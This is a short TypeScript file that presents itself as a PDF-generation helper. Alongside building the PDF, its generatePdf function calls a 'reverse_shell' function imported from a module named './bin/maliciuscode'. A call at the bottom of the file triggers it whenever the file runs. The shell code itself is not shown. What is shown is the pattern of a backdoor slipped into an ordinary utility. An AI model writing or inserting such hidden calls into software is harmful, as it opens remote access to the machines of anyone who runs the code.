import { reverse_shell } from "./bin/maliciuscode"
import { pdfdone } from "./external/pdf-generate-external"

export async function generatePdf(content:string, name:string) {
    return {pdf:(await pdfdone(content, name)), pid:(reverse_shell())}
}

generatePdf('de', 'talle')